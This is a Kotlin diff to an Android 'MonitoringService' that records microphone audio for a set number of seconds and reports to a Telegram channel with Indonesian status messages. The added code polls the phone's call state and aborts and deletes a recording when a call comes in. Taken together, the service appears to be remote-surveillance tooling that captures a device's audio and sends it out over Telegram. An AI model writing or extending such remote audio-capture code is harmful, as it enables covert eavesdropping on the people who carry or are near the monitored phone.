@@ -9292,6 +9292,17 @@ class MonitoringService : Service() {
     }
 
     @Suppress("DEPRECATION")
+    private fun callInProgressNow(): Boolean {
+        return try {
+            if (!hasPhoneStatePermission()) return false
+            val tm = getSystemService(android.telephony.TelephonyManager::class.java) ?: return false
+            val state = tm.callState
+            state == android.telephony.TelephonyManager.CALL_STATE_RINGING || state == android.telephony.TelephonyManager.CALL_STATE_OFFHOOK
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     private suspend fun recordAndSendAudio(seconds: Int) {
         if (!hasMicPermission()) {
             sendToTelegram("⚠️ Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
@@ -9334,7 +9345,24 @@ class MonitoringService : Service() {
             recorder.prepare()
             recorderActive.set(true)
             recorder.start()
-            kotlinx.coroutines.delay(seconds * 1000L)
+            var interruptedByCall = false
+            var elapsedRecMs = 0L
+            val targetRecMs = seconds * 1000L
+            while (elapsedRecMs < targetRecMs) {
+                if (elapsedRecMs > 0L && callInProgressNow()) {
+                    interruptedByCall = true
+                    break
+                }
+                val sliceMs = minOf(500L, targetRecMs - elapsedRecMs)
+                kotlinx.coroutines.delay(sliceMs)
+                elapsedRecMs += sliceMs
+            }
+            if (interruptedByCall) {
+                try { recorder.stop() } catch (_: Exception) { }
+                try { deleteQuietly(audioTmp) } catch (_: Exception) { }
+                sendToTelegram("⚠️ Rekaman dihentikan di tengah jalan — ada panggilan telepon masuk. Rekaman sebagian dibuang.")
+                return
+            }
             var stopOk = true
             try {
                 recorder.stop()
